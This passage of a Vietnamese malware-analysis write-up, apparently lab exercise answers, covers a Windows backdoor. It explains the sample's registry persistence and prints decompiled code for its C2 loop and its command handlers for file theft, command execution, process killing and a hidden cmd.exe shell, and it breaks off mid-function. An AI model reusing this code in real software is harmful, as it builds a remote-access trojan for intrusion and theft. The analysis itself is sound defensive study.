+- `CreatePipe`: Tạo 1 pipe I/O ngầm.
+- `CreateProcessA`: Tạo 1 tiến trình mới.
+- `PeekNamePipe`: Kiểm tra xem pipe có dữ liệu không.
+- `Read/WriteFile`: Đọc ghi qua I/O.
+Cụm này tạo ra hành vi: tạo tiến trình ngầm và thực hiện giao tiếp với tiến trình qua I/O.
+*ADVAPI32.DLL*
+```
+#	Thunk	Ordinal	Hint	Name
+0	00009a66		0171	RegOpenKeyA
+1	00009a54		0186	RegSetValueExA
+2	00009a46		015b	RegCloseKey
+3	00009a74		00d7	GetUserNameA
+```
+Các API này tạo nên hành vi: mở, đọc, chỉnh sửa registry.
+*WS2_32.DLL*
+API này dùng để giao tiếp mạng, nên bản thân nó đã có thể tạo ra hành vi độc hại.
+
+3. 
+Đây là các chuỗi khả nghi trong file:
+![[Pasted image 20260922155129.png]]
+- `sysinfo` thường gợi đến system information, nhưng vấn đề ở đây là không có lệnh, hay phần mềm chuẩn nào của Windows là `sysinfo`, có thể đây là 1 lệnh tùy chỉnh -> gợi ý về hành vi remote shell. Các từ khóa khác như `fxftest`, `configserver`, `DIR`, `upfileok`, `upfileer` cũng tương tự.
+- `cmd.exe`, `\java.exe` là 2 tên phần mềm.
+- `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` là đường dẫn registry, có dùng để tự động chạy chương trình khi người dùng đăng nhập.
+- Ngoài ra còn có địa chỉ localhost `127.0.0.1`.
+
+4. 
+Bằng phân tích tĩnh cơ bản, ta thấy được cơ chế persistent được sử dụng đó là sửa registry key để giúp malware tự động khởi chạy khi người dùng đăng nhập, có thể có cơ chế khác nhưng phải phần tích nâng cao mới biết được.
+
+5. 
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  struct hostent *v3; // eax
+  struct hostent *v4; // edi
+  char *v5; // ebx
+  int v7; // [esp+0h] [ebp-588h] BYREF
+  char v8[256]; // [esp+10h] [ebp-578h] BYREF
+  char v9[256]; // [esp+110h] [ebp-478h] BYREF
+  CHAR Filename[256]; // [esp+210h] [ebp-378h] BYREF
+  char v11[80]; // [esp+310h] [ebp-278h] BYREF
+  CHAR Buffer[256]; // [esp+360h] [ebp-228h] BYREF
+  char v13[260]; // [esp+460h] [ebp-128h] BYREF
+  DWORD pcbBuffer; // [esp+564h] [ebp-24h] BYREF
+  char buf[8]; // [esp+568h] [ebp-20h] BYREF
+  char Str1; // [esp+570h] [ebp-18h] BYREF
+  int v17; // [esp+571h] [ebp-17h]
+  __int16 v18; // [esp+575h] [ebp-13h]
+  char v19; // [esp+577h] [ebp-11h]
+  int *v20; // [esp+578h] [ebp-10h]
+  int v21; // [esp+584h] [ebp-4h]
+
+  v20 = &v7;
+  if ( sub_401020() != 0 )
+  {
+    memset(Filename, 0, sizeof(Filename));
+    memset(Buffer, 0, sizeof(Buffer));
+    pcbBuffer = 80;
+    GetModuleFileNameA(hModule: nullptr, lpFilename: Filename, nSize: 0x100u);
+    GetSystemDirectoryA(lpBuffer: Buffer, uSize: 0x100u);
+    GetUserNameA(lpBuffer: v11, &pcbBuffer);
+    Buffer[1] = 0;
+    strcat(Buffer, aDocume1);
+    strcat(Buffer, v11);
+    strcat(Buffer, aJavaExe);
+    if ( strcmp(Filename, Buffer) != 0 )
+    {
+      CopyFileA(lpExistingFileName: Filename, lpNewFileName: Buffer, bFailIfExists: false);
+      sub_4012A0(lpValueName: ValueName, lpString: Buffer);
+    }
+    sub_4011B0();
+    sub_4011E0(a1: byte_40AB9C);
+    sub_401230(name: byte_40AB9C, a2: (int)byte_40AA9C);
+    strcpy(v8, byte_40AA9C);
+    dword_40A0C0 = 0;
+    strcpy(v9, byte_40AB9C);
+    while ( dword_40A0C0 == 0 )
+    {
+      v21 = 0;
+      while ( 1 )
+      {
+        if ( gethostbyname(name: name) == nullptr )
+          Sleep(dwMilliseconds: 0x7530u);
+        v3 = gethostbyname(name: name);
+        v4 = v3;
+        if ( v3 == nullptr )
+          goto LABEL_13;
+        v5 = inet_ntoa(in: **(struct in_addr **)v3->h_addr_list);
+        if ( strcmp(v5, a127001) != 0 )
+          break;
+        Sleep(dwMilliseconds: 0x7530u);
+      }
+      if ( v4 == nullptr )
+      {
+LABEL_13:
+        v21 = -1;
+        continue;
+      }
+      s = socket(af: 2, type: 1, protocol: 0);
+      if ( s == -1 )
+      {
+        Sleep(dwMilliseconds: 0x7530u);
+        v21 = -1;
+      }
+      else
+      {
+        stru_40AA70.sa_family = 2;
+        *(_WORD *)stru_40AA70.sa_data = htons(hostshort: hostshort);
+        *(_DWORD *)&stru_40AA70.sa_data[2] = inet_addr(cp: v5);
+        if ( connect(s: s, name: &stru_40AA70, namelen: 16) == -1 )
+        {
+          closesocket(s: s);
+          Sleep(dwMilliseconds: 0x7530u);
+          v21 = -1;
+        }
+        else
+        {
+          strcpy(buf, "fxftest");
+          v17 = 0;
+          v18 = 0;
+          Str1 = 0;
+          v19 = 0;
+          send(s: s, buf, len: strlen(buf), flags: 0);
+          recv(s: s, buf: &Str1, len: 8, flags: 0);
+          if ( strncmp(&Str1, Str2: buf, MaxCount: 7u) == 0 )
+          {
+            send(s: s, buf: v8, len: 512, flags: 0);
+            while ( 1 )
+            {
+              memset(v13, 0, sizeof(v13));
+              if ( dword_40A0C0 != 0 || recv(s: s, buf: v13, len: 260, flags: 0) <= 0 )
+                break;
+              switch ( *(_DWORD *)v13 )
+              {
+                case 1:
+                  sub_4018C0(s: s);
+                  break;
+                case 2:
+                  sub_401A20(s: s, lpFileName: &v13[4]);
+                  break;
+                case 3:
+                  sub_402050(s: s, lpCmdLine: &v13[4]);
+                  break;
+                case 4:
+                  sub_4020A0(s: s, lpFileName: &v13[4]);
+                  break;
+                case 5:
+                  sub_4020F0(s: s);
+                  break;
+                case 6:
+                  sub_402210(s: s, lpFileName: &v13[4]);
+                  break;
+                case 7:
+                  sub_402310(s: s);
+                  break;
+                case 8:
+                  sub_402440(s: s, String: &v13[4]);
+                  break;
+                case 9:
+                  sub_402490(s: s);
+                  break;
+                case 0xA:
+                  sub_402660(s: s, lpBuffer: &v13[4]);
+                  break;
+                case 0xB:
+                  _mtinitlocks(s: s);
+                  break;
+                case 0xC:
+                  sub_402880(s: s);
+                  break;
+                case 0xD:
+                  sub_4028C0(a1: s, a2: &v13[4]);
+                  break;
+                default:
+                  continue;
+              }
+            }
+            closesocket(s: s);
+            v21 = -1;
+          }
+          else
+          {
+            v21 = -1;
+          }
+        }
+      }
+    }
+    WSACleanup();
+  }
+  return 0;
+}
+```
+Đọc hàm `main`, ta tìm thấy ngay 1 cấu trúc `switch-case`, mở thử các hàm thì ta thấy được các chuỗi khả nghi đã thấy ở bài trên nằm rải rác trong các hàm này, ngoài ra, trước cấu trúc `switch-case`, chương trình còn thực hiện kết nối đến 1 socket mạng, điều này càng khẳng định đây chính là cơ chế remote shell của malware, và đây chính là hàm xử lí các hành vi được liệt kê trong đề bài.
+(Các câu 5, 6, 7, 8 đều được làm chung cả).
+
+6. 
+Đầu tiên, đọc qua hàm `main`, ta thấy rằng, sau khi kết nối, malware sẽ gửi 1 chuỗi `fxftest` để báo hiệu. Sau đó, máy chủ c2 sẽ gửi lại chuỗi `fxftest` để báo hiệu kết nối thành công. Sau đó, malware lại thực hiện gửi tiếp 1 đoạn dữ liệu nữa, rồi sau đó lắng nghe socket, chờ C2 gửi lệnh. Lệnh ở đây là các số định danh (command ID), để biết mỗi lệnh làm gì, ta cần phải đọc code của từng hàm tương ứng với mỗi case.
+*Case 1*
+```c
+int __cdecl sub_4018C0(SOCKET s)
+{
+  int result; // eax
+  DWORD v2; // edx
+  DWORD v3; // ebp
+  int i; // ebx
+  UINT DriveTypeA; // eax
+  unsigned int v6; // edx
+  char *v7; // edi
+  char *v8; // edi
+  char *v9; // esi
+  char v10; // cl
+  int v11; // eax
+  DWORD v12; // [esp+4h] [ebp-140h]
+  CHAR RootPathName; // [esp+8h] [ebp-13Ch] BYREF
+  char v14[11]; // [esp+9h] [ebp-13Bh] BYREF
+  char Buffer[4]; // [esp+14h] [ebp-130h] BYREF
+  char buf[300]; // [esp+18h] [ebp-12Ch] BYREF
+
+  strcpy(buf, "#");
+  memset(&buf[2], 0, 298);
+  result = GetLogicalDrives();
+  v2 = result;
+  v12 = result;
+  if ( result != 0 )
+  {
+    v3 = result;
+    for ( i = 0; i < 26; ++i )
+    {
+      if ( v2 >> i == 0 )
+        break;
+      if ( ((v2 >> i) & 1) != 0 )
+      {
+        RootPathName = i + 65;
+        strcpy(v14, ":");
+        DriveTypeA = GetDriveTypeA(lpRootPathName: &RootPathName);
+        switch ( DriveTypeA )
+        {
+          case 2u:
+            v3 = 0;
+            break;
+          case 3u:
+            v3 = 1;
+            break;
+          case 5u:
+            v3 = 2;
+            break;
+          case 4u:
+            v3 = 3;
+            break;
+          default:
+            break;
+        }
+        sprintf(Buffer, Format: "%s%d", &RootPathName, v3);
+        v6 = strlen(Buffer) + 1;
+        v7 = &buf[strlen(buf)];
+        qmemcpy(v7, Buffer, 4 * (v6 >> 2));
+        v9 = &Buffer[4 * (v6 >> 2)];
+        v8 = &v7[4 * (v6 >> 2)];
+        v10 = v6;
+        v2 = v12;
+        qmemcpy(v8, v9, v10 & 3);
+      }
+    }
+    v11 = 0;
+    strcat(buf, (const char *)&word_40A154);
+    do
+      buf[v11++] ^= 0x55u;
+    while ( v11 < 256 );
+    return send(s, buf, len: 256, flags: 0);
+  }
+  return result;
+}
+```
+Khác với dự đoán lúc đầu, các API `GetLogicalDrives`, `GetDriveTypeA` dùng để đọc thông tin về ổ đĩa của máy nạn nhân, và gửi về cho máy chủ C2. Cụ thể:
+- Đầu tiên, nó dùng API `GetLogicalDrives` để lấy dãy bit mask các ổ đĩa tồn tại, sau đó, nó thực hiện duyệt 1 toàn bộ dãy bit mask, với mỗi bit 1, nó lấy index, đem cộng với `65` là kí tự `A` để ra root của đường dẫn ổ đĩa.
+- Sau đó, nó dùng `GetDriveTypeA` để lấy thông tin về loại ổ, rồi thực hiện ghi theo format `root - type` vào buffer. 
+- Sau khi thực hiện duyệt xong các ổ, nó thêm vào kí tự `#` (`word_40A154`) để báo hiệu kết thúc, rồi đem mã hóa bằng phép xor với 0x55, rồi gửi về cho máy chủ C2.
+Vậy, `ID = 1` là lệnh lấy thông tin ổ đĩa.
+*Case 2*
+```c
+int __cdecl sub_401A20(SOCKET s, LPCSTR lpFileName)
+{
+  int i; // eax
+  HANDLE FirstFileA; // ebx
+  void (__stdcall *v5)(SOCKET, const char *, int, int); // ebp
+  CHAR *szTypeName; // edi
+  char *v7; // edi
+  DWORD dwHighDateTime; // edx
+  int j; // eax
+  CHAR *v10; // edi
+  char *v11; // edi
+  DWORD v12; // edx
+  int k; // eax
+  int m; // eax
+  char buf[2]; // [esp+Ah] [ebp-642h] BYREF
+  struct _SYSTEMTIME SystemTime; // [esp+Ch] [ebp-640h] BYREF
+  FILETIME FileTime; // [esp+1Ch] [ebp-630h] BYREF
+  HANDLE hFindFile; // [esp+24h] [ebp-628h]
+  struct _WIN32_FIND_DATAA FindFileData; // [esp+28h] [ebp-624h] BYREF
+  CHAR pszPath[516]; // [esp+168h] [ebp-4E4h] BYREF
+  char Buffer[128]; // [esp+36Ch] [ebp-2E0h] BYREF
+  SHFILEINFOA psfi; // [esp+3ECh] [ebp-260h] BYREF
+  char v23[256]; // [esp+54Ch] [ebp-100h] BYREF
+
+  for ( i = 0; i < 256; ++i )
+    lpFileName[i] ^= 0x55u;
+  memset(&FindFileData, 0, sizeof(FindFileData));
+  FirstFileA = FindFirstFileA(lpFileName, lpFindFileData: &FindFileData);
+  hFindFile = FirstFileA;
+  if ( FirstFileA == (HANDLE)-1 )
+    return send(s, buf: ::buf, len: 2, flags: 0);
+  v5 = (void (__stdcall *)(SOCKET, const char *, int, int))send;
+  send(s, buf: aO, len: 2, flags: 0);
+  memset(&psfi, 0, sizeof(psfi));
+  SHGetFileInfoA(pszPath, dwFileAttributes: 0x80u, &psfi, cbFileInfo: 0x160u, uFlags: 0x510u);
+  memset(pszPath, 0, sizeof(pszPath));
+  *(_DWORD *)&pszPath[512] = 1;
+  if ( strcmp(FindFileData.cFileName, asc_40A184) != 0 && strcmp(FindFileData.cFileName, asc_40A180) != 0 )
+  {
+    strcpy(pszPath, FindFileData.cFileName);
+    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
+      szTypeName = aDir;
+    else
+      szTypeName = psfi.szTypeName;
+    strcpy(&pszPath[256], szTypeName);
+    sprintf(Buffer, Format: "%dK", (FindFileData.nFileSizeLow - FindFileData.nFileSizeHigh) >> 10);
+    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
+      v7 = (char *)&unk_40ADAC;
+    else
+      v7 = Buffer;
+    dwHighDateTime = FindFileData.ftLastWriteTime.dwHighDateTime;
+    strcpy(&pszPath[320], v7);
+    FileTime.dwHighDateTime = dwHighDateTime;
+    FileTime.dwLowDateTime = FindFileData.ftLastWriteTime.dwLowDateTime;
+    FileTimeToSystemTime(lpFileTime: &FileTime, lpSystemTime: &SystemTime);
+    sprintf(
+      Buffer: v23,
+      Format: "%4d-%02d-%02d %02d:%02d:%02d",
+      SystemTime.wYear,
+      SystemTime.wMonth,
+      SystemTime.wDay,
+      SystemTime.wHour,
+      SystemTime.wMinute,
+      SystemTime.wSecond);
+    strcpy(&pszPath[384], v23);
+    do
+    {
+      for ( j = 0; j < 256; ++j )
+        pszPath[j] ^= 0x55u;
+      send(s: ::s, buf: pszPath, len: 516, flags: 0);
+      recv(s: ::s, buf, len: 2, flags: 0);
+    }
+    while ( atoi(String: buf) != 0 );
+  }
+  if ( FirstFileA != nullptr )
+  {
+    do
+    {
+      while ( 1 )
+      {
+        memset(pszPath, 0, sizeof(pszPath));
+        if ( !FindNextFileA(hFindFile, lpFindFileData: &FindFileData) )
+          break;
+        *(_DWORD *)&pszPath[512] = 1;
+        if ( strcmp(FindFileData.cFileName, asc_40A184) != 0 && strcmp(FindFileData.cFileName, asc_40A180) != 0 )
+        {
+          memset(&psfi, 0, sizeof(psfi));
+          SHGetFileInfoA(
+            pszPath: FindFileData.cFileName,
+            dwFileAttributes: 0x80u,
+            &psfi,
+            cbFileInfo: 0x160u,
+            uFlags: 0x510u);
+          strcpy(pszPath, FindFileData.cFileName);
+          if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
+            v10 = aDir;
+          else
+            v10 = psfi.szTypeName;
+          strcpy(&pszPath[256], v10);
+          sprintf(Buffer, Format: "%dK", (FindFileData.nFileSizeLow - FindFileData.nFileSizeHigh) >> 10);
+          if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
+            v11 = (char *)&unk_40ADAC;
+          else
+            v11 = Buffer;
+          v12 = FindFileData.ftLastWriteTime.dwHighDateTime;
+          strcpy(&pszPath[320], v11);
+          FileTime.dwHighDateTime = v12;
+          FileTime.dwLowDateTime = FindFileData.ftLastWriteTime.dwLowDateTime;
+          FileTimeToSystemTime(lpFileTime: &FileTime, lpSystemTime: &SystemTime);
+          sprintf(
+            Buffer: v23,
+            Format: "%4d-%02d-%02d %02d:%02d:%02d",
+            SystemTime.wYear,
+            SystemTime.wMonth,
+            SystemTime.wDay,
+            SystemTime.wHour,
+            SystemTime.wMinute,
+            SystemTime.wSecond);
+          strcpy(&pszPath[384], v23);
+          do
+          {
+            for ( k = 0; k < 256; ++k )
+              pszPath[k] ^= 0x55u;
+            send(s: ::s, buf: pszPath, len: 516, flags: 0);
+            recv(s: ::s, buf, len: 2, flags: 0);
+          }
+          while ( atoi(String: buf) != 0 );
+        }
+      }
+    }
+    while ( GetLastError() != 18 );
+    FirstFileA = hFindFile;
+    v5 = (void (__stdcall *)(SOCKET, const char *, int, int))send;
+  }
+  *(_DWORD *)&pszPath[512] = 0;
+  for ( m = 0; m < 256; ++m )
+    pszPath[m] ^= 0x55u;
+  v5(s: ::s, buf: pszPath, len: 516, flags: 0);
+  return FindClose(hFindFile: FirstFileA);
+}
+```
+Hàm này có nhiệm vụ lấy thông tin chi tiết về các file, folder để gửi về C2. Toàn bộ logic hàm vận hành tuần tự qua 4 giai đoạn cụ thể:
+==Giai đoạn 1: Giải mã đường dẫn và Khởi tạo tìm kiếm==
+- Giải mã tham số đường dẫn (`lpFileName`): Vòng lặp `for ( i = 0; i < 256; ++i ) lpFileName[i] ^= 0x55u;` giải mã in-place chuỗi đường dẫn nhận từ C2 (ví dụ: `C:\*.*` đã bị mã hóa trước đó).
+- Khởi tạo tìm kiếm tệp đầu tiên:
+    - Gọi `FindFirstFileA(lpFileName, &FindFileData)` để tìm đối tượng đầu tiên khớp với mẫu tìm kiếm.    
+    - Nếu thất bại (`FirstFileA == (HANDLE)-1`): Gửi gói tin báo lỗi 2 bytes (`::buf`) về C2 và kết thúc hàm ngay lập tức.
+    - Nếu thành công: Gửi gói tin 2 bytes `aO` (thường là mã phản hồi `"OK"`) về C2 để báo máy nạn nhân đã sẵn sàng truyền danh sách file.
+==Giai đoạn 2: Bóc tách thuộc tính và Đóng gói file đầu tiên==
+Mỗi mục tệp/thư mục được đóng gói thành một struct cố định **516 bytes** trên mảng `pszPath`:
+- `pszPath[0..255]` (256 bytes): Tên file (`cFileName`).
+- `pszPath[256..319]` (64 bytes): Loại file. Gọi `SHGetFileInfoA` với cờ `0x510u` (`SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES`) để lấy tên định dạng (ví dụ: _"Text Document"_, _"Application"_). Nếu cờ thuộc tính chứa `0x10` (`FILE_ATTRIBUTE_DIRECTORY`), ghi đè chuỗi này thành `"DIR"`.
+- `pszPath[320..383]` (64 bytes): Dung lượng file. Lấy `nFileSizeLow` dịch phải 10 bit (`>> 10`, tức chia cho 1024) để đổi sang KB và format dạng `"%dK"`. Nếu là thư mục (`DIR`), để trống.
+- `pszPath[384..511]` (128 bytes): Thời gian sửa đổi lần cuối (`ftLastWriteTime`). Dùng `FileTimeToSystemTime` đổi sang giờ hệ thống và format thành chuỗi `"YYYY-MM-DD HH:MM:SS"`.
+- `pszPath[512..515]` (4 bytes - DWORD): Cờ trạng thái (Has More Files flag), gán bằng `1` (báo hiệu vẫn còn dữ liệu phía sau).
+==Quy trình gửi gói tin có xác nhận (ACK Handshake):==
+- Bỏ qua hai thư mục ảo `.` và `..` (`asc_40A184` và `asc_40A180`).
+- Mã hóa XOR `0x55` cho 256 bytes đầu của `pszPath` (chỉ mã hóa phần tên file).
+- Gửi toàn bộ gói `516 bytes` qua socket: `send(s, pszPath, 516, 0)`.
+- Chờ phản hồi từ C2 qua `recv(s, buf, 2, 0)`. Nếu `atoi(buf) != 0`, tiếp tục lặp lại quá trình gửi cho đến khi server trả về mã chấp nhận (bảo đảm server đã đọc xong, tránh nghẽn socket).
+==Giai đoạn 3: Vòng lặp duyệt toàn bộ tệp còn lại (`FindNextFileA`)==
+- Vòng lặp quét:
+    - Gọi `FindNextFileA(hFindFile, &FindFileData)` liên tục trong vòng lặp `while(1)`.  
+    - Đối với mỗi tệp/thư mục tìm thấy, mã độc lặp lại toàn bộ quy trình đóng gói 516 bytes (lấy tên, loại, dung lượng KB, ngày giờ, gán cờ `pszPath[512] = 1`, XOR 256 bytes đầu, gửi và chờ ACK từ C2) tương tự như ở Giai đoạn 2.
+- Điều kiện thoát:
+    - Khi `FindNextFileA` trả về `FALSE`, vòng lặp kiểm tra mã lỗi hệ thống:
+```c
+while ( GetLastError() != 18 ); // 18 = ERROR_NO_MORE_FILES
+``` 
+	- Khi duyệt hết danh sách tệp trong thư mục, vòng lặp chính thức dừng lại.
+==Giai đoạn 4: Gửi gói tin kết thúc (EOF) và Dọn dẹp tài nguyên==
+- Tạo gói tin EOF (End of File):
+    - Đặt cờ trạng thái `pszPath[512] = 0` (báo cho C2 biết đã hết tệp, dừng nhận).
+    - Mã hóa XOR `0x55` cho 256 bytes đầu của `pszPath`.    
+    - Gửi gói tin 516 bytes cuối cùng này về C2.
+- Đóng handle:
+    - Gọi `FindClose(FirstFileA)` để giải phóng handle tìm kiếm file của hệ điều hành và trả về kết quả.
+Vậy, `ID = 2` là lệnh liệt kê chi tiết thông tin về file/folder.
+*Case 3*
+```c
+int __cdecl sub_402050(SOCKET s, LPCSTR lpCmdLine)
+{
+  int i; // eax
+
+  for ( i = 0; i < 256; ++i )
+    lpCmdLine[i] ^= 0x55u;
+  if ( (int)WinExec(lpCmdLine, uCmdShow: 0) <= 31 )
+    return send(s, buf: a1, len: 2, flags: 0);
+  else
+    return send(s, buf: a0, len: 2, flags: 0);
+}
+```
+Hàm này có nhiệm vụ mã hóa và thực thi ngầm 1 lệnh/tiến trình mà C2 yêu cầu.
+- API `WinExec(lpCmdLine, uCmdShow: 0)` sẽ gọi trực tiếp đến file thực thi nằm trong `lpCmdLine`, nên Hàm này thiên về việc chạy ngầm 1 tiến trình mà C2 yêu cầu hơn, trừ khi C2 yêu cầu dạng `./file.exe <command>` thì khi này mới có thể nó là thực thi lệnh mà C2 yêu cầu.
+Vậy, `ID = 3` giúp thực thi lệnh/tiến trình mà C2 yêu cầu.
+*Case 4*
+```c
+int __cdecl sub_4020A0(SOCKET s, LPCSTR lpFileName)
+{
+  int i; // eax
+
+  for ( i = 0; i < 256; ++i )
+    lpFileName[i] ^= 0x55u;
+  if ( DeleteFileA(lpFileName) )
+    return send(s, buf: a0, len: 2, flags: 0);
+  else
+    return send(s, buf: a1, len: 2, flags: 0);
+}
+```
+Hàm này có nhiệm vụ xóa file theo tên hoặc đường dẫn tuyệt đối mà C2 cung cấp.
+Vậy, `ID = 4` là lệnh xóa file.
+*Case 5*
+```c
+int __cdecl sub_4020F0(SOCKET s)
+{
+  int i; // eax
+  HANDLE FileA; // ebp
+  int v4; // ebx
+  DWORD v5; // eax
+  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-608h] BYREF
+  CHAR buf[512]; // [esp+14h] [ebp-604h] BYREF
+  int v8; // [esp+214h] [ebp-404h]
+  char Buffer[1024]; // [esp+218h] [ebp-400h] BYREF
+
+  recv(s, buf, len: 516, flags: 0);
+  for ( i = 0; i < 512; ++i )
+    buf[i] ^= 0x55u;
+  FileA = CreateFileA(
+            lpFileName: buf,
+            dwDesiredAccess: 0x40000000u,
+            dwShareMode: 2u,
+            lpSecurityAttributes: nullptr,
+            dwCreationDisposition: 2u,
+            dwFlagsAndAttributes: 0x80u,
+            hTemplateFile: nullptr);
+  if ( FileA == nullptr )
+    return send(s, buf: aUpfileer, len: 9, flags: 0);
+  v4 = v8;
+  if ( v8 != 0 )
+  {
+    while ( 1 )
+    {
+      memset(Buffer, 0, sizeof(Buffer));
+      v5 = recv(s, buf: Buffer, len: 1024, flags: 0);
+      if ( v5 == -1 )
+        break;
+      v4 -= v5;
+      if ( !WriteFile(
+              hFile: FileA,
+              lpBuffer: Buffer,
+              nNumberOfBytesToWrite: v5,
+              lpNumberOfBytesWritten: &NumberOfBytesWritten,
+              lpOverlapped: nullptr) )
+        return send(s, buf: aUpfileer, len: 9, flags: 0);
+      if ( v4 == 0 )
+        goto LABEL_9;
+    }
+    CloseHandle(hObject: FileA);
+    return send(s, buf: aUpfileer, len: 9, flags: 0);
+  }
+  else
+  {
+LABEL_9:
+    CloseHandle(hObject: FileA);
+    return send(s, buf: aUpfileok, len: 9, flags: 0);
+  }
+}
+```
+Hàm này có nhiệm vụ tạo 1 file mới/mở file đã có trên máy nạn nhân và ghi dữ liệu mà c2 gửi xuống vào đó.
+Vậy, `ID = 5` là ghi dữ liệu vào file.
+*Case 6*
+```c
+HANDLE __cdecl sub_402210(SOCKET s, LPCSTR lpFileName)
+{
+  int i; // eax
+  HANDLE result; // eax
+  HANDLE v4; // esi
+  HANDLE FileMappingA; // eax
+  void *v6; // ebx
+  const char *v7; // edi
+  int j; // eax
+  char buf[512]; // [esp+Ch] [ebp-204h] BYREF
+  int len; // [esp+20Ch] [ebp-4h]
+
+  for ( i = 0; i < 256; ++i )
+    lpFileName[i] ^= 0x55u;
+  result = CreateFileA(
+             lpFileName,
+             dwDesiredAccess: 0x80000000,
+             dwShareMode: 1u,
+             lpSecurityAttributes: nullptr,
+             dwCreationDisposition: 3u,
+             dwFlagsAndAttributes: 0x8000000u,
+             hTemplateFile: nullptr);
+  v4 = result;
+  if ( result != (HANDLE)-1 )
+  {
+    FileMappingA = CreateFileMappingA(
+                     hFile: result,
+                     lpFileMappingAttributes: nullptr,
+                     flProtect: 0x8000002u,
+                     dwMaximumSizeHigh: 0,
+                     dwMaximumSizeLow: 0,
+                     lpName: nullptr);
+    v6 = FileMappingA;
+    if ( FileMappingA != nullptr )
+    {
+      v7 = (const char *)MapViewOfFile(
+                           hFileMappingObject: FileMappingA,
+                           dwDesiredAccess: 4u,
+                           dwFileOffsetHigh: 0,
+                           dwFileOffsetLow: 0,
+                           dwNumberOfBytesToMap: 0);
+      if ( v7 != nullptr )
+      {
+        len = GetFileSize(hFile: v4, lpFileSizeHigh: nullptr);
+        for ( j = 0; j < 512; ++j )
+          buf[j] ^= 0x55u;
+        send(s, buf, len: 516, flags: 0);
+        send(s, buf: v7, len, flags: 0);
+        UnmapViewOfFile(lpBaseAddress: v7);
+      }
+      CloseHandle(hObject: v6);
+      return (HANDLE)CloseHandle(hObject: v4);
+    }
+    else
+    {
+      return (HANDLE)CloseHandle(hObject: v4);
+    }
+  }
+  return result;
+}
+```
+Hàm này thực hiện các hành vi: Lấy handle của 1 file trên máy, ánh xạ nó lên RAM, và gửi file về cho C2 (upload).
+Vậy, `ID = 6` là lệnh upload file.
+*Case = 7*
+```c
+int __cdecl sub_402310(SOCKET s)
+{
+  int i; // eax
+  int j; // eax
+  char String[2]; // [esp+6h] [ebp-236h] BYREF
+  HANDLE hSnapshot; // [esp+8h] [ebp-234h]
+  char buf[256]; // [esp+Ch] [ebp-230h] BYREF
+  DWORD th32ProcessID; // [esp+10Ch] [ebp-130h]
+  int v8; // [esp+110h] [ebp-12Ch]
+  PROCESSENTRY32 pe; // [esp+114h] [ebp-128h] BYREF
+
+  pe.dwSize = 296;
+  hSnapshot = CreateToolhelp32Snapshot(dwFlags: 2u, th32ProcessID: 0);
+  v8 = 1;
+  if ( Process32First(hSnapshot, lppe: &pe) )
+  {
+    do
+    {
+      strcpy(buf, pe.szExeFile);
+      th32ProcessID = pe.th32ProcessID;
+      do
+      {
+        for ( i = 0; i < 256; ++i )
+          buf[i] ^= 0x55u;
+        send(s, buf, len: 264, flags: 0);
+        recv(s, buf: String, len: 2, flags: 0);
+      }
+      while ( atoi(String) != 0 );
+    }
+    while ( Process32Next(hSnapshot, lppe: &pe) );
+  }
+  v8 = 0;
+  for ( j = 0; j < 256; ++j )
+    buf[j] ^= 0x55u;
+  return send(s, buf, len: 264, flags: 0);
+}
+```
+Hàm này có nhiệm vụ liệt kê tiến trình trên máy.
+- `PROCESSENTRY32` là cấu trúc chứa thông tin của một tiến trình (PID, tên file `.exe`, tiến trình cha, số luồng...).
+- `CreateToolhelp32Snapshot`: Chụp lại toàn bộ trạng thái của hệ thống tại 1 thời điểm.
+- `Process32First`: Duyệt  và lấy thông tin về tiến trình đầu tiên trong snapshot.
+- `Process32Next`: Duyệt và lấy thông tin về các tiến trình kế tiếp.
+Vậy, `ID = 7` là lệnh duyệt và liệt kê các tiến trình trên máy.
+*Case 8*
+```c
+int __cdecl sub_402440(SOCKET s, char *String)
+{
+  DWORD v2; // eax
+  HANDLE v3; // eax
+
+  v2 = atoi(String);
+  v3 = OpenProcess(dwDesiredAccess: 1u, bInheritHandle: false, dwProcessId: v2);
+  if ( TerminateProcess(hProcess: v3, uExitCode: 0xFFFFFFFF) )
+    return send(s, buf: a0, len: 2, flags: 0);
+  else
+    return send(s, buf: a1, len: 2, flags: 0);
+}
+```
+Hàm này dùng để kill 1 process đang chạy.
+Vậy, `ID = 8` là lệnh kill process.
+*Case 9*
+```c
+int __cdecl sub_402490(SOCKET s)
+{
+  DWORD v1; // eax
+  int i; // eax
+  int j; // eax
+  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+10h] [ebp-106Ch] BYREF
+  CHAR CommandLine[8]; // [esp+1Ch] [ebp-1060h] BYREF
+  struct _STARTUPINFOA StartupInfo; // [esp+24h] [ebp-1058h] BYREF
+  struct _PROCESS_INFORMATION ProcessInformation; // [esp+68h] [ebp-1014h] BYREF
+  char Buffer[4096]; // [esp+78h] [ebp-1004h] BYREF
+  int v10; // [esp+1078h] [ebp-4h]
+
+  PipeAttributes.nLength = 12;
+  PipeAttributes.lpSecurityDescriptor = nullptr;
+  PipeAttributes.bInheritHandle = true;
+  CreatePipe(hReadPipe: &hNamedPipe, hWritePipe: &hWritePipe, lpPipeAttributes: &PipeAttributes, nSize: 0);
+  CreatePipe(hReadPipe: &dword_40AA8C, hWritePipe: &hFile, lpPipeAttributes: &PipeAttributes, nSize: 0);
+  memset(&StartupInfo, 0, sizeof(StartupInfo));
+  strcpy(CommandLine, "cmd.exe");
+  StartupInfo.hStdError = hWritePipe;
+  StartupInfo.hStdOutput = hWritePipe;
+  StartupInfo.hStdInput = dword_40AA8C;
+  StartupInfo.dwFlags = 257;
+  StartupInfo.wShowWindow = 0;
+  CreateProcessA(
+    lpApplicationName: nullptr,
+    lpCommandLine: CommandLine,
+    lpProcessAttributes: nullptr,
+    lpThreadAttributes: nullptr,
+    bInheritHandles: true,
+    dwCreationFlags: 0,
+    lpEnvironment: nullptr,
+    lpCurrentDirectory: nullptr,
+    lpStartupInfo: &StartupInfo,
+    lpProcessInformation: &ProcessInformation);
+  Sleep(dwMilliseconds: 0x7D0u);
+  v10 = 1;
+  do
+  {
+    PeekNamedPipe(
+      hNamedPipe: hNamedPipe,
+      lpBuffer: Buffer,
+      nBufferSize: 0x200u,
